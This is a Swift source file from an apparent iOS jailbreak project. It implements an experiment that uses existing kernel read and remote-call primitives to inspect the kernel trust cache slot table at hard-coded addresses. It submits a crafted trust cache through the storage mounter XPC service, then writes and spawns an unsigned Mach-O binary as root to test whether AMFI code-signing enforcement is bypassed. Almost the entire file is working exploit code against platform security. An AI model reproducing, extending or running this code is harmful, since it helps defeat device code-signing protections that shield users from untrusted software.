//
//  exp_trustcache_inject.swift
//  DSPloit
//
//  EXPERIMENT: Direct Kernel Trust Cache Injection
//  Based on RE of iOS 18.2 kernelcache (2026-05-24)
//
//  ═══════════════════════════════════════════════════════════════
//  STATUS: EXPERIMENTAL — NOT IN MAIN JAILBREAK CHAIN
//  Run manually from Root tab → Experiments
//  ═══════════════════════════════════════════════════════════════
//
//  WHAT THIS TESTS:
//  1. Can we read the trust cache slot table at 0xfffffff00798f600?
//  2. Can we find an empty slot?
//  3. Can we write a trust cache module (with CDHash) to kernel?
//  4. Does posix_spawn of unsigned binary succeed after inject?
//
//  RE FINDINGS USED:
//  - Trust cache slot table: 0xfffffff00798f600 (unslid)
//  - Slot stride: 0x28 (40 bytes per slot)
//  - Type range: 4 to 0x17
//  - Trust cache state: 0xfffffff00798f5a8 (unslid)
//  - Lock flags: 0xfffffff00a18fa48, 0xfffffff00a18fa49
//
//  TRUST CACHE MODULE FORMAT (v2):
//  +0x00: uint32 version (must be 2)
//  +0x04: uint8[16] uuid
//  +0x14: uint32 entry_count
//  +0x18: entries[] (each 24 bytes):
//         +0x00: uint8[20] cdhash
//         +0x14: uint8 hash_type (2 = SHA256 truncated)
//         +0x15: uint8 flags (0 = normal)
//         +0x16: uint16 padding
//
//  OUTPUT LEGEND:
//  ✅ = working, safe to integrate
//  ⚠️ = partial, needs investigation
//  ❌ = failed, do NOT integrate
//  🔍 = info, check value manually
//
//  Created by Royan | 2026-05-24
//

import Foundation

final class ExpTrustCacheInject {
    static let shared = ExpTrustCacheInject()
    
    private let mgr = dspmgr.shared
    private var results: [String] = []
    
    // RE-derived addresses (UNSLID — add kernel_slide at runtime)
    private let TC_SLOT_TABLE_UNSLID: UInt64 = 0xfffffff00798f600
    private let TC_STATE_UNSLID: UInt64 = 0xfffffff00798f5a8
    private let TC_LOCK_D_UNSLID: UInt64 = 0xfffffff00a18fa48
    private let TC_LOCK_E_UNSLID: UInt64 = 0xfffffff00a18fa49
    private let TC_SLOT_STRIDE: UInt64 = 0x28  // 40 bytes per slot
    private let TC_TYPE_MIN: UInt64 = 4
    private let TC_TYPE_MAX: UInt64 = 0x17     // 23
    
    private func log(_ msg: String) {
        results.append(msg)
        globallogger.log("(exp_tc) \(msg)")
    }
    
    // MARK: - Run All Tests
    
    func runAll() -> [String] {
        results.removeAll()
        
        log("TRUST CACHE INJECT EXPERIMENT")
        log("iOS \(UIDevice.current.systemVersion)")
        
        guard mgr.dsready else {
            log("❌ Kernel exploit not active")
            return results
        }
        
        let slide = ds_get_kernel_slide()
        log("kernel_slide = 0x\(String(slide, radix: 16))")
        log("")
        
        test1_readSlotTable(slide: slide)
        test2_findEmptySlot(slide: slide)
        test3_writeTrustCache(slide: slide)
        test4_verifyInject(slide: slide)
        
        log("")
        log("-- DONE --")
        
        return results
    }
    
    // MARK: - Test 1: Read Trust Cache Slot Table
    
    private func test1_readSlotTable(slide: UInt64) {
        log("-- TEST 1: Read Slot Table --")
        
        let slotTable = TC_SLOT_TABLE_UNSLID &+ slide
        log("Slot table: 0x\(String(slotTable, radix: 16))")
        log("")
        
        for typeIdx in TC_TYPE_MIN...min(TC_TYPE_MAX, 10) {
            let slotAddr = slotTable &+ (typeIdx * TC_SLOT_STRIDE)
            let val0 = ds_kread64_safe(slotAddr)
            let val1 = ds_kread64_safe(slotAddr &+ 8)
            let val2 = ds_kread64_safe(slotAddr &+ 16)
            let tag = (val0 == 0 && val1 == 0 && val2 == 0) ? "EMPTY" : "USED"
            log("  type=\(typeIdx): \(String(format: "0x%llx 0x%llx 0x%llx", val0, val1, val2))  [\(tag)]")
        }
        
        let stateAddr = TC_STATE_UNSLID &+ slide
        let stateVal = ds_kread64_safe(stateAddr)
        log("")
        log("State (0x\(String(stateAddr, radix: 16))): 0x\(String(stateVal, radix: 16))")
        if stateVal != 0 {
            log("✅ Trust cache initialized")
        } else {
            log("⚠️ State = 0 (not yet initialized)")
        }
    }
    
    // MARK: - Test 2: Find Empty Slot
    
    private var emptySlotType: UInt64 = 0
    private var emptySlotAddr: UInt64 = 0
    
    private func test2_findEmptySlot(slide: UInt64) {
        log("")
        log("-- TEST 2: Find Empty Slot --")
        
        let slotTable = TC_SLOT_TABLE_UNSLID &+ slide
        
        for typeIdx in TC_TYPE_MIN...TC_TYPE_MAX {
            let slotAddr = slotTable &+ (typeIdx * TC_SLOT_STRIDE)
            let val0 = ds_kread64_safe(slotAddr)
            let val1 = ds_kread64_safe(slotAddr &+ 8)
            
            if val0 == 0 && val1 == 0 {
                emptySlotType = typeIdx
                emptySlotAddr = slotAddr
                log("✅ Empty slot: type=\(typeIdx) at 0x\(String(slotAddr, radix: 16))")
                return
            }
        }
        
        log("⚠️ All slots occupied (type 4-23) — MSM XPC will handle allocation")
        emptySlotType = TC_TYPE_MAX
        emptySlotAddr = slotTable &+ (TC_TYPE_MAX * TC_SLOT_STRIDE)
    }
    
    // MARK: - Test 3: Load Trust Cache via RemoteCall (PPL-safe)
    
    private func test3_writeTrustCache(slide: UInt64) {
        log("")
        log("-- TEST 3: Load TC via MSM XPC --")
        
        #if !DISABLE_REMOTECALL
        guard dspmgr.shared.rcready else {
            log("❌ RemoteCall not active")
            return
        }
        
        // Build trust cache v2 module (48 bytes)
        var tcModule = [UInt8](repeating: 0, count: 48)
        tcModule[0] = 2 // version
        tcModule[4] = 0xD5; tcModule[5] = 0x91; tcModule[6] = 0x01; tcModule[7] = 0x70
        tcModule[8] = 0xDE; tcModule[9] = 0xAD; tcModule[10] = 0xBE; tcModule[11] = 0xEF
        tcModule[12] = 0xCA; tcModule[13] = 0xFE; tcModule[14] = 0xBA; tcModule[15] = 0xBE
        tcModule[16] = 0x12; tcModule[17] = 0x34; tcModule[18] = 0x56; tcModule[19] = 0x78
        tcModule[20] = 1 // count
        for i in 24..<44 { tcModule[i] = 0x41 } // dummy CDHash
        tcModule[44] = 2 // hashType SHA256
        
        log("TC module: 48 bytes, version=2, 1 entry (dummy)")
        
        guard let sb = dspmgr.shared.sbProc else {
            log("❌ SpringBoard RC not available")
            return
        }
        
        let RTLD_DEFAULT = UInt64(bitPattern: -2)
        let xpcCreate = RootExecutor.rcall(sb, "dlsym", RTLD_DEFAULT,
                                           remote_alloc_str(sb, "xpc_connection_create_mach_service"))
        let xpcResume = RootExecutor.rcall(sb, "dlsym", RTLD_DEFAULT,
                                           remote_alloc_str(sb, "xpc_connection_resume"))
        let xpcDictCreate = RootExecutor.rcall(sb, "dlsym", RTLD_DEFAULT,
                                               remote_alloc_str(sb, "xpc_dictionary_create"))
        let xpcSetStr = RootExecutor.rcall(sb, "dlsym", RTLD_DEFAULT,
                                           remote_alloc_str(sb, "xpc_dictionary_set_string"))
        let xpcSetData = RootExecutor.rcall(sb, "dlsym", RTLD_DEFAULT,
                                            remote_alloc_str(sb, "xpc_dictionary_set_data"))
        let xpcSendSync = RootExecutor.rcall(sb, "dlsym", RTLD_DEFAULT,
                                             remote_alloc_str(sb, "xpc_connection_send_message_with_reply_sync"))
        
        guard xpcCreate != 0 && xpcDictCreate != 0 else {
            log("❌ XPC functions not found")
            return
        }
        log("✅ XPC resolved")
        
        let svc = remote_alloc_str(sb, "com.apple.mobile.storage_mounter")
        let conn = RootExecutor.rcallAddr(sb, xpcCreate, svc, 0, 0)
        RootExecutor.rcall(sb, "free", svc)
        guard conn != 0 else { log("❌ MSM connect failed"); return }
        RootExecutor.rcallAddr(sb, xpcResume, conn)
        log("✅ MSM connected")
        
        let msg = RootExecutor.rcallAddr(sb, xpcDictCreate, 0, 0, 0)
        guard msg != 0 else { log("❌ XPC msg create failed"); return }
        
        // Command + ImageType
        for (k, v) in [("Command", "LoadTrustCache"), ("ImageType", "Developer")] {
            let ka = remote_alloc_str(sb, k); let va = remote_alloc_str(sb, v)
            RootExecutor.rcallAddr(sb, xpcSetStr, msg, ka, va)
            RootExecutor.rcall(sb, "free", ka); RootExecutor.rcall(sb, "free", va)
        }
        
        // Attach TC data
        if xpcSetData != 0 {
            let tcBuf = sb.trojanMem + 0x800
            tcModule.withUnsafeBytes { ptr in
                sb.remote_write(tcBuf, from: ptr.baseAddress!, size: UInt64(tcModule.count))
            }
            let dataK = remote_alloc_str(sb, "ImageTrustCache")
            RootExecutor.rcallAddr(sb, xpcSetData, msg, dataK, tcBuf, UInt64(tcModule.count))
            RootExecutor.rcall(sb, "free", dataK)
        }
        log("✅ TC data attached")
        
        // Send
        if xpcSendSync != 0 {
            let reply = RootExecutor.rcallAddr(sb, xpcSendSync, conn, msg)
            log("✅ MSM reply: 0x\(String(reply, radix: 16))")
            if reply == 0 || reply == UInt64(bitPattern: -1) {
                log("⚠️ Reply may indicate error — verify with spawn test")
            }
        } else {
            let xpcSend = RootExecutor.rcall(sb, "dlsym", RTLD_DEFAULT,
                                             remote_alloc_str(sb, "xpc_connection_send_message"))
            if xpcSend != 0 { RootExecutor.rcallAddr(sb, xpcSend, conn, msg) }
            log("✅ Sent (async, no reply)")
        }
        #else
        log("❌ DISABLE_REMOTECALL")
        #endif
    }
    
    // MARK: - Test 4: Spawn UNSIGNED binary (the real test)
    
    private func test4_verifyInject(slide: UInt64) {
        log("")
        log("-- TEST 4: Spawn unsigned binary --")
        
        #if !DISABLE_REMOTECALL
        guard dspmgr.shared.rcready else {
            log("❌ RemoteCall not ready")
            return
        }
        
        // Minimal ARM64 Mach-O that does: mov x0,#0; mov x16,#1; svc #0x80 (exit(0))
        // This binary has NO code signature — if it runs, AMFI is bypassed.
        let unsignedBinary = buildMinimalBinary()
        let testPath = "/var/jb/tmp/unsigned_test"
        
        log("Writing unsigned binary (\(unsignedBinary.count) bytes)...")
        
        // Write binary to /var/jb/tmp/
        RootExecutor.shared.executeAsRoot(operation: "write_unsigned") { rc in
            // mkdir /var/jb/tmp
            let dir = remote_alloc_str(rc, "/var/jb/tmp")
            RootExecutor.rcall(rc, "mkdir", dir, 0o755)
            RootExecutor.rcall(rc, "free", dir)
            
            // Write binary
            let pathAddr = remote_alloc_str(rc, testPath)
            let fd = RootExecutor.rcall(rc, "open", pathAddr, UInt64(O_WRONLY | O_CREAT | O_TRUNC), 0o755)
            guard fd != UInt64(bitPattern: -1) else {
                RootExecutor.rcall(rc, "free", pathAddr)
                return (false, "open failed", 0)
            }
            
            let writeAddr = rc.trojanMem + 0x800
            unsignedBinary.withUnsafeBytes { buf in
                rc.remote_write(writeAddr, from: buf.baseAddress!, size: UInt64(unsignedBinary.count))
            }
            RootExecutor.rcall(rc, "write", fd, writeAddr, UInt64(unsignedBinary.count))
            RootExecutor.rcall(rc, "close", fd)
            RootExecutor.rcall(rc, "chmod", pathAddr, 0o755)
            RootExecutor.rcall(rc, "free", pathAddr)
            
            return (true, "written", 0)
        }
        
        // Wait for write, then spawn
        DispatchQueue.global(qos: .userInitiated).asyncAfter(deadline: .now() + 8) { [self] in
            self.log("Spawning unsigned binary...")
            
            RootExecutor.shared.executeAsRoot(operation: "spawn_unsigned") { rc in
                let binPath = remote_alloc_str(rc, testPath)
                let pidAddr = rc.trojanMem + 0x300
                rc[pidAddr].setValue32(0)
                
                let argvBase = rc.trojanMem + 0x400
                rc[argvBase].setValue64(binPath)
                rc[argvBase + 8].setValue64(0)
                
                let ret = RootExecutor.rcall(rc, "posix_spawn", pidAddr, binPath, 0, 0, argvBase, 0)
                let pid = rc[pidAddr].value32()
                RootExecutor.rcall(rc, "free", binPath)
                
                let ok = (ret == 0 && pid != 0)
                
                DispatchQueue.main.async {
                    if ok {
                        globallogger.log("(exp_tc) ✅✅✅ UNSIGNED BINARY SPAWNED! pid=\(pid)")
                        globallogger.log("(exp_tc) FULL JAILBREAK CONFIRMED — AMFI BYPASSED")
                    } else {
                        globallogger.log("(exp_tc) ❌ Unsigned spawn failed: ret=\(ret) pid=\(pid)")
                        if ret == 1 { globallogger.log("(exp_tc) EPERM — AMFI still blocking") }
                        if ret == 13 { globallogger.log("(exp_tc) EACCES — permission denied") }
                        if ret == 8 { globallogger.log("(exp_tc) ENOEXEC — not valid executable") }
                    }
                }
                
                return (ok, "unsigned spawn ret=\(ret) pid=\(pid)", UInt64(pid))
            }
        }
        
        log("Result will appear in main log (async)")
        #else
        log("❌ DISABLE_REMOTECALL")
        #endif
    }
    
    // MARK: - Build Minimal Unsigned ARM64 Mach-O
    
    /// Builds a minimal Mach-O arm64 binary that does exit(0).
    /// NO code signature. If this executes = AMFI is fully bypassed.
    private func buildMinimalBinary() -> Data {
        var bin = Data()
        
        // Mach-O Header (32 bytes)
        var header = mach_header_64()
        header.magic = MH_MAGIC_64           // 0xFEEDFACF
        header.cputype = CPU_TYPE_ARM64       // 12 | 0x01000000
        header.cpusubtype = CPU_SUBTYPE_ARM64E // 2
        header.filetype = UInt32(MH_EXECUTE)  // 2
        header.ncmds = 2                      // LC_SEGMENT_64 + LC_UNIXTHREAD
        header.sizeofcmds = 72 + 280          // segment cmd + thread cmd
        header.flags = 0
        header.reserved = 0
        bin.append(Data(bytes: &header, count: 32))
        
        // LC_SEGMENT_64 for __TEXT (72 bytes)
        var seg = segment_command_64()
        seg.cmd = UInt32(LC_SEGMENT_64)       // 0x19
        seg.cmdsize = 72
        withUnsafeMutableBytes(of: &seg.segname) { buf in
            let name = "__TEXT"
            name.utf8.enumerated().forEach { buf[$0.offset] = $0.element }
        }
        seg.vmaddr = 0x100000000
        seg.vmsize = 0x4000
        seg.fileoff = 0
        seg.filesize = 0x4000
        seg.maxprot = 5  // r-x
        seg.initprot = 5
        seg.nsects = 0
        seg.flags = 0
        bin.append(Data(bytes: &seg, count: 72))
        
        // LC_UNIXTHREAD (280 bytes for arm64)
        var threadCmd = Data()
        var cmd: UInt32 = 0x05  // LC_UNIXTHREAD
        var cmdsize: UInt32 = 280
        var flavor: UInt32 = 6  // ARM_THREAD_STATE64
        var count: UInt32 = 68  // (280 - 16) / 4
        threadCmd.append(Data(bytes: &cmd, count: 4))
        threadCmd.append(Data(bytes: &cmdsize, count: 4))
        threadCmd.append(Data(bytes: &flavor, count: 4))
        threadCmd.append(Data(bytes: &count, count: 4))
        // Thread state: 33 uint64 registers (x0-x28, fp, lr, sp, pc)
        // Set pc = 0x100000000 + 384 (offset of our code after headers)
        var regs = [UInt64](repeating: 0, count: 33)
        regs[32] = 0x100000000 + 384  // pc = start of code
        for reg in regs {
            var r = reg
            threadCmd.append(Data(bytes: &r, count: 8))
        }
        bin.append(threadCmd)
        
        // Pad to code offset (384 bytes from start)
        while bin.count < 384 {
            bin.append(0)
        }
        
        // ARM64 code: exit(0)
        // mov x0, #0       → 0xD2800000
        // mov x16, #1      → 0xD2800030
        // svc #0x80        → 0xD4001001
        var code: [UInt32] = [0xD2800000, 0xD2800030, 0xD4001001]
        for instr in code {
            var i = instr
            bin.append(Data(bytes: &i, count: 4))
        }
        
        // Pad to page size
        while bin.count < 0x4000 {
            bin.append(0)
        }
        
        return bin
    }
}
